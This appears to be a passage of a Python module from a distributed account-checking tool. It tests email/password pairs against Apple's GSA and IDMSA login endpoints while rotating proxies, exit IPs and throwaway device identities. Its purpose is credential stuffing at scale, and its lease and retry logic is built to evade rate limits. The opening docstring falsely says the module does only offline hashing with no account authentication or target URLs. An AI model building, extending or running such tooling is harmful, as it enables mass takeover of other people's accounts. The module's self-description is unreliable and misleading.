"""The only executor: offline line hashing, with optional synthetic delay.

No plugin loading, account authentication, shell commands or target URLs.
"""
from collections import deque
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from contextlib import nullcontext
import base64
import hashlib
import ipaddress
import json
import math
import multiprocessing as mp
import os
from pathlib import Path
import queue
import re
import threading
import time
from urllib.parse import urlsplit

from .common import atomic_json, read_json


PROXY_TTL_SECONDS = 50.0
PROXY_FETCH_LIMIT = 1000
PROXY_POOL_LIMIT = 10000
PROXY_FAILURE_LIMIT = 3
PROXY_AGING_SECONDS = 45.0
PROXY_ACQUIRE_WAIT_SECONDS = 5.0
PROXY_EMPTY_GRACE_SECONDS = 60.0
PROXY_RETRY_DELAY_SECONDS = 5.0
DEVICE_LEASE_POLL_SECONDS = 0.05
# One identity is used at most DEVICE_USE_LIMIT times and then retired. Keep
# its public headers for that identity's complete lifetime instead of forcing
# another provider/Apple refresh every 30 seconds.
DEVICE_IDENTITY_TTL_SECONDS = None
DEVICE_REGISTRATION_TIMEOUT_SECONDS = 20.0
DEVICE_USE_LIMIT = 20
LOCAL_QUEUE_LOW_WATER = 100
LOCAL_QUEUE_TARGET = 300
MIN_STALL_TIMEOUT_SECONDS = 180.0
PROXY_DEBUG_ENV = 'CLUSTER_PROXY_DEBUG'
PERFORMANCE_TRACE_SAMPLE_EVERY = 20
PERFORMANCE_TRACE_SLOW_MS = 30000.0
PROXY_EXIT_IP_URL = 'https://api.ipify.org?format=json'
PROXY_EXIT_IP_TIMEOUT = 4.0
PROXY_EXIT_IP_MAX = 2048
STAGE_SAMPLE_LIMIT = 2048


def _percentile(values, percentile):
    """Return a deterministic nearest-rank percentile for bounded telemetry."""
    ordered = sorted(float(value) for value in values)
    if not ordered:
        return 0.0
    rank = max(0, min(len(ordered) - 1,
                      math.ceil((float(percentile) / 100.0) * len(ordered)) - 1))
    return round(ordered[rank], 3)


class StageTelemetry:
    """Low-volume aggregate timings for the public node task-log API.

    It never stores accounts, proxy endpoints or response bodies.  Debug mode
    pays two short lock acquisitions per outer stage; normal execution uses a
    disabled instance and therefore has no shared-lock overhead.
    """

    def __init__(self, enabled=False):
        self.enabled = bool(enabled)
        self.lock = threading.Lock()
        self.active = {}
        self.completed = {}
        self.wall_ms = {}
        self.cpu_ms = {}
        self.maximum_ms = {}
        self.samples = {}
        self.errors = {}
        self.started_wall = time.monotonic()
        self.started_cpu = time.process_time()

    def begin(self, stage):
        if not self.enabled:
            return None
        name = str(stage or 'unknown')[:60]
        with self.lock:
            self.active[name] = self.active.get(name, 0) + 1
        return name, time.monotonic(), time.thread_time()

    def end(self, token):
        if token is None:
            return
        name, wall_started, cpu_started = token
        self.observe(name, (time.monotonic() - wall_started) * 1000.0,
                     (time.thread_time() - cpu_started) * 1000.0, active_delta=-1)

    def observe(self, stage, wall_ms, cpu_ms=0.0, active_delta=0):
        if not self.enabled:
            return
        name = str(stage or 'unknown')[:60]
        wall = max(0.0, float(wall_ms or 0.0))
        cpu = max(0.0, float(cpu_ms or 0.0))
        with self.lock:
            if active_delta:
                self.active[name] = max(
                    0, self.active.get(name, 0) + int(active_delta))
            self.completed[name] = self.completed.get(name, 0) + 1
            self.wall_ms[name] = self.wall_ms.get(name, 0.0) + wall
            self.cpu_ms[name] = self.cpu_ms.get(name, 0.0) + cpu
            self.maximum_ms[name] = max(self.maximum_ms.get(name, 0.0), wall)
            samples = self.samples.setdefault(name, deque(maxlen=STAGE_SAMPLE_LIMIT))
            samples.append(wall)

    def record_error(self, category):
        if not self.enabled:
            return
        name = str(category or 'other')[:60]
        with self.lock:
            self.errors[name] = self.errors.get(name, 0) + 1

    def snapshot(self, retry_waiting=0):
        if not self.enabled:
            return {'enabled': False}
        with self.lock:
            names = sorted(set(self.active) | set(self.completed))
            stages = {}
            for name in names:
                values = list(self.samples.get(name, ()))
                completed = int(self.completed.get(name, 0))
                total = float(self.wall_ms.get(name, 0.0))
                stages[name] = {
                    'active': int(self.active.get(name, 0)),
                    'completed': completed,
                    'window_samples': len(values),
                    'average_ms': round(total / completed, 3) if completed else 0.0,
                    'p50_ms': _percentile(values, 50),
                    'p95_ms': _percentile(values, 95),
                    'p99_ms': _percentile(values, 99),
                    'maximum_ms': round(float(self.maximum_ms.get(name, 0.0)), 3),
                    'wall_total_ms': round(total, 3),
                    'thread_cpu_total_ms': round(float(self.cpu_ms.get(name, 0.0)), 3),
                }
            elapsed_ms = max(0.001, (time.monotonic() - self.started_wall) * 1000.0)
            process_cpu_ms = max(0.0, (time.process_time() - self.started_cpu) * 1000.0)
            return {
                'enabled': True,
                'retry_waiting': max(0, int(retry_waiting or 0)),
                'elapsed_ms': round(elapsed_ms, 3),
                'process_cpu_ms': round(process_cpu_ms, 3),
                'process_core_equivalents': round(process_cpu_ms / elapsed_ms, 3),
                'errors': dict(sorted(self.errors.items())),
                'stages': stages,
            }


def stall_timeout_seconds(descriptor, minimum=MIN_STALL_TIMEOUT_SECONDS,
                          padding=60.0):
    """Return a no-progress budget larger than every configured retry."""
    timeout = max(0.1, float(descriptor.get('timeout') or 20))
    attempts = max(0, int(descriptor.get('retries') or 0)) + 1
    return max(float(minimum), timeout * attempts + float(padding))


def _partition_device_slots(slot_ids, process_count, process_index):
    """Give every process a disjoint share of the full device pool."""
    slots = [int(value) for value in slot_ids]
    count = max(1, int(process_count))
    index = max(0, int(process_index))
    return slots[index::count]


def _effective_auth_workers(configured, slot_ids, request_budget=None):
    """Bound real threads by exclusive devices and an optional node budget."""
    limit = max(1, int(configured or 1))
    slots = len(list(slot_ids or ()))
    budget = limit if request_budget is None else max(1, int(request_budget or 1))
    return max(1, min(limit, slots or 1, budget))


def _slot_for_account(account, slot_ids):
    """Map one account to a stable, evenly distributed device slot."""
    slots = [int(value) for value in slot_ids]
    if not slots:
        raise ValueError('device slot list is empty')
    digest = hashlib.sha256(str(account or '').strip().casefold().encode('utf-8')).digest()
    prefix = base64.urlsafe_b64encode(digest).decode('ascii').rstrip('=')[:8]
    return slots[int.from_bytes(digest[:8], 'big') % len(slots)], 'B64:' + prefix


def _device_id_label(device_id):
    """Return the same short, non-secret device identifier used by the node UI."""
    raw = str(device_id or '').encode('utf-8')
    return ('B64:' + base64.urlsafe_b64encode(raw).decode('ascii').rstrip('=')[:8]
            if raw else '')


def _cached_device_identity(identities, fetched_at, slot, now=None):
    """Return public headers for the current device identity until retirement."""
    identity = identities.get(slot)
    # `fetched_at`/`now` remain accepted for compatibility with callers and
    # diagnostics. A fresh physical identity always clears both dictionaries
    # before this lookup, so no time-based expiry is needed here.
    return identity if identity is not None else None


def _local_queue_refill_count(workers, pending, queued):
    """Return how many local records to enqueue for a 100/300 refill cycle."""
    worker_count = max(1, int(workers))
    pending_count = max(0, int(pending))
    queued_count = max(0, int(queued))
    if pending_count and queued_count > LOCAL_QUEUE_LOW_WATER:
        return 0
    return max(0, worker_count + LOCAL_QUEUE_TARGET - pending_count)


def _reset_incomplete_device_slots(pool, slots):
    """Make every assigned task slot usable before worker threads start.

    A killed registration can leave an identifier file without ``adi_pb``.
    ``DevicePool.inspect`` calls that state ``pending``; it is neither a
    reusable device nor a missing slot, so an allocator would otherwise skip
    it forever.  A new task keeps complete registered identities, but removes
    incomplete/invalid bytes from only its own freshly assigned slot set.
    """
    import portalocker
    import shutil

    reset = []
    for value in slots:
        slot = int(value)
        if pool.inspect(slot).get('state') not in ('pending', 'invalid'):
            continue
        directory = pool.slot_directory(slot)
        directory.mkdir(mode=0o700, parents=True, exist_ok=True)
        lock_path = directory / '.lease.lock'
        descriptor = os.open(lock_path, os.O_CREAT | os.O_RDWR, 0o600)
        with os.fdopen(descriptor, 'a+') as handle:
            portalocker.lock(handle, portalocker.LOCK_EX)
            try:
                if pool.inspect(slot).get('state') not in ('pending', 'invalid'):
                    continue
                for path in directory.iterdir():
                    if path.name == '.lease.lock':
                        continue
                    if path.is_dir():
                        shutil.rmtree(path, ignore_errors=True)
                    else:
                        path.unlink(missing_ok=True)
                reset.append(slot)
            finally:
                portalocker.unlock(handle)
    return reset


class DeviceAuthLease:
    """A process-safe, exclusive lease for one persisted device slot."""

    def __init__(self, handle, state_path, slot, initial_state, pool):
        self.handle = handle
        self.state_path = state_path
        self.slot = int(slot)
        self.initial_state = str(initial_state or 'missing')
        self.pool = pool
        self.uses = 0
        self.use_limit = DEVICE_USE_LIMIT
        self.retire_on_release = False
        self.released = False

    @classmethod
    def try_acquire(cls, pool, slot):
        """Try one slot without waiting; file locking covers all processes."""
        import portalocker

        directory = pool.slot_directory(int(slot))
        directory.mkdir(mode=0o700, parents=True, exist_ok=True)
        lock_path = directory / '.lease.lock'
        state_path = directory / '.lease-state.json'
        descriptor = os.open(lock_path, os.O_CREAT | os.O_RDWR, 0o600)
        handle = os.fdopen(descriptor, 'a+')
        try:
            portalocker.lock(handle, portalocker.LOCK_EX | portalocker.LOCK_NB)
        except portalocker.exceptions.LockException:
            handle.close()
            return None
        initial_state = pool.inspect(int(slot)).get('state') or 'missing'
        if initial_state not in ('ready', 'missing'):
            portalocker.unlock(handle)
            handle.close()
            return None
        now = time.time()
        previous = read_json(state_path, {})
        atomic_json(state_path, {
            'state': 'in_use', 'slot': int(slot), 'pid': os.getpid(),
            'acquired_at': now,
            'last_used_at': previous.get('last_used_at'),
        })
        return cls(handle, state_path, slot, initial_state, pool)

    def reset_registered_usage(self, device_root):
        """A newly registered identity starts at zero uses."""
        _set_device_usage(device_root, self.slot, 0)
        self.uses = 0

    def consume(self, device_root, use_limit=DEVICE_USE_LIMIT):
        """Atomically consume one use immediately before the external request."""
        self.use_limit = max(1, int(use_limit or DEVICE_USE_LIMIT))
        self.uses = _consume_device_use(device_root, self.slot, self.use_limit)
        self.retire_on_release = self.uses >= self.use_limit
        return self.uses

    def _retire_identity(self):
        """Remove identity bytes while retaining the slot's lock files."""
        directory = self.pool.slot_directory(self.slot)
        for path in directory.iterdir() if directory.is_dir() else ():
            if path.name in ('.lease.lock', '.lease-state.json'):
                continue
            if path.is_dir():
                import shutil
                shutil.rmtree(path, ignore_errors=True)
            else:
                path.unlink(missing_ok=True)

    def clear_incomplete_identity(self):
        """Return a failed registration to a clean, immediately reusable slot."""
        if self.pool.inspect(self.slot).get('state') not in ('pending', 'invalid'):
            return False
        self._retire_identity()
        self.uses = 0
        self.retire_on_release = False
        return True

    @classmethod
    def acquire_any(cls, pool, slots, stop):
        """Prefer an idle ready device, then claim one missing slot to register."""
        candidates = [int(slot) for slot in slots]
        if not candidates:
            raise ValueError('device slot list is empty')
        while not stop.is_set():
            ready, missing = [], []
            for slot in candidates:
                state = pool.inspect(slot).get('state')
                if state == 'ready':
                    ready.append(slot)
                elif state == 'missing':
                    missing.append(slot)
            for slot in ready + missing:
                lease = cls.try_acquire(pool, slot)
                if lease is not None:
                    return lease
            stop.wait(DEVICE_LEASE_POLL_SECONDS)
        raise InterruptedError('节点关闭，停止等待设备')

    def release(self):
        """Write the return timestamp before making the slot available again."""
        if self.released:
            return
        import portalocker

        now = time.time()
        try:
            if self.retire_on_release:
                self._retire_identity()
            atomic_json(self.state_path, {
                'state': 'retired' if self.retire_on_release else 'idle',
                'slot': self.slot, 'uses': self.uses,
                'last_used_at': now,
                'last_used': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(now)),
            })
        finally:
            portalocker.unlock(self.handle)
            self.handle.close()
            self.released = True


class DeviceLeaseAllocator:
    """Rotate scan starts so hundreds of threads do not hammer slot one."""

    def __init__(self, pool, slots, device_root=None, use_limit=DEVICE_USE_LIMIT):
        self.pool = pool
        self.device_root = device_root
        self.use_limit = max(1, int(use_limit or DEVICE_USE_LIMIT))
        self.lock = threading.Lock()
        self.usage = _usage_snapshot(device_root)
        self.dirty_usage = set()
        self.ready = []
        self.missing = []
        for slot in (int(value) for value in slots):
            state = pool.inspect(slot).get('state')
            if state == 'ready':
                self.ready.append(slot)
            elif state == 'missing':
                self.missing.append(slot)
        self.ready_cursor = 0
        self.missing_cursor = 0

    def _rotated(self):
        with self.lock:
            ready = list(self.ready)
            missing = list(self.missing)
            if ready:
                offset = self.ready_cursor % len(ready)
                self.ready_cursor += 1
                ready = ready[offset:] + ready[:offset]
            if missing:
                offset = self.missing_cursor % len(missing)
                self.missing_cursor += 1
                missing = missing[offset:] + missing[:offset]
        return ready, missing

    def acquire(self, stop):
        while not stop.is_set():
            ready, missing = self._rotated()
            for slot in ready + missing:
                lease = DeviceAuthLease.try_acquire(self.pool, slot)
                if lease is not None:
                    with self.lock:
                        prior = int(self.usage.get(slot, 0))
                    if lease.initial_state == 'ready' and prior >= self.use_limit:
                        lease.uses = prior
                        lease.use_limit = self.use_limit
                        lease.retire_on_release = True
                        lease.release()
                        # The retired identity bytes are gone.  Reset the slot
                        # counter so the next owner can register a fresh
                        # identity in this same pool slot.
                        with self.lock:
                            self.usage[slot] = 0
                            self.dirty_usage.add(slot)
                        continue
                    return lease
            stop.wait(DEVICE_LEASE_POLL_SECONDS)
        raise InterruptedError('节点关闭，停止等待设备')

    def reset_registered(self, lease):
        """Publish a freshly registered slot for ready-first reuse."""
        # Persist the new generation's zero before publishing it to other
        # threads and to the live device-pool API.
        _set_device_usage(self.device_root, lease.slot, 0)
        with self.lock:
            self.usage[lease.slot] = 0
            self.dirty_usage.add(lease.slot)
            if lease.slot not in self.ready:
                self.ready.append(lease.slot)
            if lease.slot in self.missing:
                self.missing.remove(lease.slot)
        lease.uses = 0

    def consume(self, lease):
        """Consume once under an in-process lock immediately before sending."""
        with self.lock:
            current = max(0, int(self.usage.get(lease.slot, 0)))
            if current >= self.use_limit:
                lease.uses = current
                lease.retire_on_release = True
                raise RuntimeError(
                    f'device slot {lease.slot} reached use limit {self.use_limit}')
            current += 1
            self.usage[lease.slot] = current
            self.dirty_usage.add(lease.slot)
        lease.uses = current
        lease.use_limit = self.use_limit
        lease.retire_on_release = current >= self.use_limit
        return current

    def current_usage(self, slot):
        with self.lock:
            return max(0, int(self.usage.get(int(slot), 0)))

    def flush_usage(self):
        """Persist this process' disjoint slot counters in one locked write."""
        with self.lock:
            values = {slot: self.usage[slot] for slot in self.dirty_usage}
            self.dirty_usage.clear()
        _merge_device_usage(self.device_root, values)


def _proxy_debug_enabled(descriptor=None):
    # A controller-supplied value is authoritative, including explicit False.
    # This lets the system setting turn logging off even when an older node
    # service still has CLUSTER_PROXY_DEBUG=1 in its environment.
    if descriptor is not None and '_proxy_debug' in descriptor:
        return bool(descriptor.get('_proxy_debug'))
    value = os.environ.get(PROXY_DEBUG_ENV, '')
    return str(value).strip().lower() in ('1', 'true', 'yes', 'on')


def _proxy_identity(value):
    """Return a credential-free endpoint identity for diagnostics."""
    if not value:
        return {'endpoint': '', 'host': '', 'port': None}
    try:
        parsed = urlsplit(str(value))
        host, port = (parsed.hostname or ''), parsed.port
    except (TypeError, ValueError):
        host, port = '', None
    endpoint = f'{host}:{port}' if host and port is not None else host
    return {'endpoint': endpoint[:160], 'host': host[:128], 'port': port}


def _proxy_pool_snapshot(pool):
    if pool is None:
        return {}
    try:
        return pool.snapshot()
    except Exception:                                               # noqa: BLE001
        return {}


def _proxy_debug_detail(value):
    text = str(value or '')
    text = re.sub(r'(?i)((?:https?|socks5h?)://)[^/@\s]+@', r'\1***@', text)
    text = re.sub(r'(?i)(password|passwd|pwd|token|key)=([^&\s]+)', r'\1=***', text)
    return text[:240]


def _apple_reason_for_record(result, status, debug=False):
    """Return Apple's raw message only for an explicitly debug-enabled job."""
    if not debug:
        return ''
    message = result.get('apple_message')
    if isinstance(message, str) and message.strip():
        return message.strip()[:2048]
    if status == 'need_2fa':
        auth_type = str(result.get('auth_type') or '').strip()
        if auth_type and auth_type != 'none':
            return f'au={auth_type[:80]}'
    return ''


def _repair_probe_method(web_result, trace):
    """Translate one supplemental IDMSA result without changing GSA truth.

    ``au=repair`` is an umbrella GSA continuation.  IDMSA's complete response
    is more specific, but only an explicit hsa/hsa2 challenge may be called a
    verification-code flow.  HTTP 412 / ``needs_setup`` remains a security or
    repair flow even when it carries an hsa-looking authType.
    """
    result = web_result if isinstance(web_result, dict) else {}
    metadata = trace.get('complete') if isinstance(trace, dict) else None
    metadata = metadata if isinstance(metadata, dict) else {}
    auth_type = str(metadata.get('auth_type') or '').strip().casefold()
    web_status = str(result.get('status') or '').strip().casefold()
    if web_status == 'need_2fa' and auth_type in ('hsa', 'hsa2'):
        return 'verification_code'
    if auth_type in ('sa', 'non-sa', 'dnu') or web_status == 'needs_setup':
        return 'security_repair'
    return 'repair_unspecified'


def _refine_repair_auth(result, email, password, proxy, timeout, cancel,
                        retries=0, checker=None):
    """Probe IDMSA once only after a verified GSA ``au=repair`` response.

    The GSA result remains authoritative.  A failed supplemental request never
    turns a password-verified account into an error or a retry outcome.
    """
    if (not isinstance(result, dict)
            or result.get('status') != 'need_2fa'
            or str(result.get('auth_type') or '').strip().casefold() != 'repair'):
        return result
    if checker is None:
        from fastcheck.protocols.idmsa import check as checker
    trace = {}

    def remember(event):
        if not isinstance(event, dict):
            return
        stage = str(event.get('stage') or '')
        if stage in ('init', 'complete'):
            metadata = {
                'http': event.get('http'),
                'auth_type': event.get('auth_type'),
                'attempt': event.get('attempt'),
                'server': str(event.get('server') or '')[:128],
                'via': str(event.get('via') or '')[:128],
                'retry_after': str(event.get('retry_after') or '')[:64],
                'content_type': str(event.get('content_type') or '')[:128],
                'response_body_bytes': event.get('response_body_bytes'),
                'response_body_sha256': str(event.get('response_body_sha256') or '')[:64],
                'response_keys': list(event.get('response_keys') or [])[:32],
                'service_error_codes': list(event.get('service_error_codes') or [])[:16],
                'has_session_headers': bool(event.get('has_session_headers')),
                'has_set_cookie': bool(event.get('has_set_cookie')),
            }
            trace[stage] = metadata
            trace['latest'] = metadata

    try:
        web_result = checker(email, password, proxy, timeout=timeout,
                             retries=max(0, int(retries or 0)),
                             cancel=cancel, trace=remember)
    except Exception as exc:                                      # noqa: BLE001
        # Persist only the exception class.  Exception messages from HTTP
        # libraries may contain proxy URLs (and therefore credentials).
        web_result = {'status': 'error', 'kind': type(exc).__name__,
                      'detail': type(exc).__name__}
    web_result = web_result if isinstance(web_result, dict) else {}
    latest = (trace.get('latest') if isinstance(trace.get('latest'), dict)
              else trace.get('complete') if isinstance(trace.get('complete'), dict)
              else trace.get('init') if isinstance(trace.get('init'), dict)
              else {})
    complete = trace.get('complete') if isinstance(trace.get('complete'), dict) else {}
    enriched = dict(result)
    enriched.update(
        two_factor_method=_repair_probe_method(web_result, trace),
        web_auth_type=str(complete.get('auth_type') or '')[:32],
        web_http=latest.get('http'),
        web_status=str(web_result.get('status') or '')[:32],
        web_stage=str(web_result.get('stage') or
                      ('complete' if complete else 'init' if latest else ''))[:32],
        web_kind=str(web_result.get('kind') or '')[:64],
        web_detail=str(web_result.get('detail') or '')[:256],
        web_attempts=max(0, int(latest.get('attempt') or 0)),
        web_server=latest.get('server') or '',
        web_via=latest.get('via') or '',
        web_retry_after=latest.get('retry_after') or '',
        web_content_type=latest.get('content_type') or '',
        web_response_bytes=latest.get('response_body_bytes'),
        web_response_sha256=latest.get('response_body_sha256') or '',
        web_response_keys=(latest.get('response_keys') or []) if latest else None,
        web_service_error_codes=(latest.get('service_error_codes') or []) if latest else None,
        web_has_session_headers=bool(latest.get('has_session_headers')) if latest else None,
        web_has_set_cookie=bool(latest.get('has_set_cookie')) if latest else None,
    )
    # Web sa/non-sa proves the password and belongs in the password-correct
    # bucket even when GSA used its broad au=repair continuation.
    if (str(complete.get('auth_type') or '').strip().casefold() in ('sa', 'non-sa')
            and str(web_result.get('status') or '').strip().casefold()
            in ('valid', 'needs_setup')):
        enriched['status'] = 'valid'
    return enriched


def _refine_repair_auth_with_rotation(result, email, password, proxy, timeout,
                                      cancel, retries, rotate_proxy,
                                      checker=None):
    """Retry transient Web HTTP 0/5xx checks on newly acquired exits.

    GSA is deliberately not repeated because its ``au=repair`` result is
    already authoritative; only the supplemental Web request is retried.
    """
    current_proxy = proxy
    refined = result
    attempts = 0
    rotations = 0
    exhausted = False
    limit = max(0, int(retries or 0)) + 1
    for attempt in range(limit):
        attempts += 1
        refined = _refine_repair_auth(
            result, email, password, current_proxy, timeout, cancel,
            retries=0, checker=checker)
        try:
            web_http = int(refined.get('web_http'))
        except (TypeError, ValueError):
            web_http = None
        transient = (str(refined.get('web_status') or '').casefold() == 'error'
                     and web_http in (0, 500, 502, 503, 504))
        if not transient or attempt + 1 >= limit or (cancel and cancel()):
            break
        current_proxy, available = rotate_proxy(attempt + 1)
        if not available:
            exhausted = True
            break
        rotations += 1
    if isinstance(refined, dict) and refined is not result:
        refined['web_attempts'] = attempts
        refined['web_proxy_rotations'] = rotations
        if exhausted:
            refined['web_rotation_exhausted'] = True
    return refined


def _srp_timing_summary(phase_ms, phase_cpu_ms, phase_counts, sampled):
    """Summarize measured SRP leaf phases; missing samples are never zero."""
    stages = {}
    for name in ('init', 'challenge'):
        compute = f'srp_{name}_compute'
        wait = f'srp_{name}_lane_wait'
        compute_calls = int(phase_counts.get(compute, 0))
        wait_calls = int(phase_counts.get(wait, 0))
        stages[name] = {
            'compute_calls': compute_calls if sampled else None,
            'compute_wall_ms': (round(phase_ms.get(compute, 0), 3)
                                if compute_calls else None),
            'compute_cpu_ms': (round(phase_cpu_ms.get(compute, 0), 3)
                               if compute_calls else None),
            'lane_wait_calls': wait_calls if sampled else None,
            'lane_wait_ms': (round(phase_ms.get(wait, 0), 3)
                             if wait_calls else None),
            'lane_wait_cpu_ms': (round(phase_cpu_ms.get(wait, 0), 3)
                                 if wait_calls else None),
        }
    observed = any(value['compute_calls'] for value in stages.values())
    return {
        'scope': 'sampled_attempt_leaf_phases',
        'state': ('observed' if observed else
                  'no_compute_events' if sampled else 'not_sampled'),
        'challenge_observed': (bool(stages['challenge']['compute_calls'])
                               if sampled else None),
        'compute_cpu_ms': (round(sum(value['compute_cpu_ms'] or 0
                                    for value in stages.values()), 3)
                           if observed else None),
        'compute_wall_ms': (round(sum(value['compute_wall_ms'] or 0
                                     for value in stages.values()), 3)
                            if observed else None),
        'lane_wait_ms': (round(sum(value['lane_wait_ms'] or 0
                                  for value in stages.values()), 3)
                         if any(value['lane_wait_calls'] for value in stages.values())
                         else None),
        **stages,
    }


def _write_proxy_debug(path, event, **fields):
    """Append one bounded JSONL event without ever persisting proxy credentials."""
    if not path:
        return
    payload = {'at': round(time.time(), 6), 'event': str(event),
               'pid': os.getpid(), 'thread': threading.current_thread().name}
    payload.update(fields)
    raw = (json.dumps(payload, ensure_ascii=False, separators=(',', ':'),
                      default=str) + '\n').encode('utf-8')
    # One O_APPEND write keeps concurrent worker lines intact.  Truncate large
    # exception details before this helper so a single event remains bounded.
    fd = os.open(str(path), os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    try:
        os.write(fd, raw)
    finally:
        os.close(fd)


def _probe_proxy_exit_ip(proxy, timeout=PROXY_EXIT_IP_TIMEOUT, url=None):
    """Return the public exit IP observed through one proxy endpoint."""
    import requests

    value = str(proxy or '')
    if not value:
        raise ValueError('missing proxy endpoint')
    response = requests.get(
        url or os.environ.get('CLUSTER_PROXY_DEBUG_IP_URL') or PROXY_EXIT_IP_URL,
        proxies={'http': value, 'https': value},
        timeout=max(0.5, float(timeout)), allow_redirects=False,
        headers={'User-Agent': 'clusterlab-proxy-debug/1'},
    )
    response.raise_for_status()
    try:
        payload = response.json()
    except ValueError:
        candidate = response.text.strip()
    else:
        candidate = str(payload.get('ip') or '').strip() if isinstance(payload, dict) else ''
    if not candidate:
        raise ValueError('exit IP response is empty')
    return str(ipaddress.ip_address(candidate))


class _ProxyExitIpDebug:
    """Bounded asynchronous exit-IP sampler used only by debug-mode workers."""

    def __init__(self, path, probe=None, limit=None, workers=4):
        configured = os.environ.get('CLUSTER_PROXY_DEBUG_IP_MAX')
        try:
            requested = int(configured if limit is None and configured else
                            (PROXY_EXIT_IP_MAX if limit is None else limit))
        except (TypeError, ValueError):
            requested = PROXY_EXIT_IP_MAX
        self.path = path
        self.limit = max(1, min(10000, requested))
        self.probe = probe or _probe_proxy_exit_ip
        self.queue = queue.Queue(maxsize=self.limit)
        self.lock = threading.Lock()
        self.seen = set()
        self.attempt_results = {}
        self.switches = set()
        self.submitted = 0
        self.completed = 0
        self.errors = 0
        self.skipped = 0
        self.closed = False
        self.threads = []
        for index in range(max(1, min(4, int(workers or 1)))):
            thread = threading.Thread(target=self._run,
                                      name=f'proxy-exit-ip-{index}', daemon=True)
            thread.start()
            self.threads.append(thread)

    def submit(self, proxy, trigger, **fields):
        identity = _proxy_identity(proxy)
        endpoint = identity['endpoint']
        if not endpoint:
            return False
        sample_key = (endpoint, str(trigger), fields.get('row'),
                      fields.get('slot'), fields.get('attempt'))
        with self.lock:
            if self.closed or sample_key in self.seen:
                return False
            if len(self.seen) >= self.limit:
                self.skipped += 1
                return False
            self.seen.add(sample_key)
            self.submitted += 1
        item = (str(proxy), identity, {'trigger': str(trigger), **fields})
        try:
            self.queue.put_nowait(item)
        except queue.Full:
            with self.lock:
                self.skipped += 1
            _write_proxy_debug(self.path, 'exit_ip_probe_skipped',
                               endpoint=identity['endpoint'], host=identity['host'],
                               port=identity['port'], reason='queue_full')
            return False
        return True

    def _run(self):
        while True:
            item = self.queue.get()
            try:
                if item is None:
                    return
                proxy, identity, fields = item
                started = time.monotonic()
                try:
                    exit_ip = self.probe(proxy)
                    elapsed = round((time.monotonic() - started) * 1000, 2)
                    _write_proxy_debug(
                        self.path, 'exit_ip_probe', probe_status='ok',
                        exit_ip=exit_ip, probe_ms=elapsed,
                        endpoint=identity['endpoint'], host=identity['host'],
                        port=identity['port'], **fields)
                    self._record_attempt(identity, fields, 'ok', exit_ip)
                    with self.lock:
                        self.completed += 1
                except Exception as exc:                          # noqa: BLE001
                    elapsed = round((time.monotonic() - started) * 1000, 2)
                    _write_proxy_debug(
                        self.path, 'exit_ip_probe', probe_status='error',
                        exit_ip='', probe_ms=elapsed,
                        endpoint=identity['endpoint'], host=identity['host'],
                        port=identity['port'], error_type=type(exc).__name__,
                        detail=_proxy_debug_detail(exc), **fields)
                    self._record_attempt(identity, fields, 'error', '')
                    with self.lock:
                        self.errors += 1
            finally:
                self.queue.task_done()

    def _record_attempt(self, identity, fields, status, exit_ip):
        row, slot, attempt = (fields.get('row'), fields.get('slot'),
                              fields.get('attempt'))
        if row is None or slot is None or attempt is None:
            return
        key = (row, slot, int(attempt))
        current = {'endpoint': identity['endpoint'], 'host': identity['host'],
                   'port': identity['port'], 'exit_ip': exit_ip,
                   'probe_status': status}
        pairs = []
        with self.lock:
            self.attempt_results[key] = current
            for left_attempt in (int(attempt) - 1, int(attempt)):
                if left_attempt < 0:
                    continue
                pair_key = (row, slot, left_attempt, left_attempt + 1)
                left = self.attempt_results.get((row, slot, left_attempt))
                right = self.attempt_results.get((row, slot, left_attempt + 1))
                if left is None or right is None or pair_key in self.switches:
                    continue
                self.switches.add(pair_key)
                pairs.append((left_attempt, left, right))
        for left_attempt, left, right in pairs:
            verified = (left['probe_status'] == 'ok' and
                        right['probe_status'] == 'ok')
            _write_proxy_debug(
                self.path, 'exit_ip_switch', row=row, slot=slot,
                from_attempt=left_attempt, to_attempt=left_attempt + 1,
                previous_endpoint=left['endpoint'], endpoint=right['endpoint'],
                previous_exit_ip=left['exit_ip'], exit_ip=right['exit_ip'],
                previous_probe_status=left['probe_status'],
                probe_status=right['probe_status'], verified=verified,
                gateway_changed=left['endpoint'] != right['endpoint'],
                port_changed=left['port'] != right['port'],
                exit_ip_changed=(left['exit_ip'] != right['exit_ip']
                                 if verified else None))

    def snapshot(self):
        with self.lock:
            return {'limit': self.limit, 'submitted': self.submitted,
                    'completed': self.completed, 'errors': self.errors,
                    'skipped': self.skipped, 'pending': self.queue.unfinished_tasks}

    def close(self, timeout=10.0):
        with self.lock:
            self.closed = True
        deadline = time.monotonic() + max(0.0, float(timeout))
        while self.queue.unfinished_tasks and time.monotonic() < deadline:
            time.sleep(0.02)
        for _thread in self.threads:
            try:
                self.queue.put_nowait(None)
            except queue.Full:
                break
        for thread in self.threads:
            thread.join(max(0.0, deadline - time.monotonic()))


class NodeProxyPool:
    """Fresh-first proxy pool shared by every process in one node package."""

    def __init__(self, context, concurrency, ttl=PROXY_TTL_SECONDS, target=None):
        concurrency = max(1, int(concurrency or 1))
        requested_target = concurrency if target is None else max(1, int(target))
        self.target = min(PROXY_POOL_LIMIT, requested_target)
        self.low_water = max(1, min(self.target, concurrency // 2 or 1))
        self.ttl = max(1.0, float(ttl))
        self.fresh = context.Queue(maxsize=self.target)
        self.reusable = context.Queue(maxsize=self.target)
        self.fresh_count = context.Value('i', 0)
        self.reusable_count = context.Value('i', 0)
        self.in_use_count = context.Value('i', 0)
        self.fetched = context.Value('q', 0)
        self.fetch_calls = context.Value('q', 0)
        self.fetch_errors = context.Value('q', 0)
        self.reused = context.Value('q', 0)
        self.discarded = context.Value('q', 0)
        self.soft_failures = context.Value('q', 0)
        self.waits = context.Value('q', 0)
        self.duplicates = context.Value('q', 0)
        self.refreshed = context.Value('q', 0)
        # Supplier-local history: no Manager/RPC on the worker hot path.
        self._recent_exits = {}
        self.last_fetch_ms = context.Value('d', 0.0)
        self.aging_inventory = context.Value('i', 0)
        self.refill = context.Event()
        self.refill.set()
        self.ready = context.Event()

    @staticmethod
    def _add(counter, delta):
        with counter.get_lock():
            counter.value = max(0, counter.value + int(delta))
            return counter.value

    @staticmethod
    def _value(counter):
        with counter.get_lock():
            return counter.value

    @staticmethod
    def _exit_key(value):
        parsed = urlsplit(str(value))
        return ((parsed.hostname or str(value)).lower(), parsed.port)

    def add_fresh(self, values, fetched_at=None):
        # Called by the single supplier; remember even in-flight/failed exits
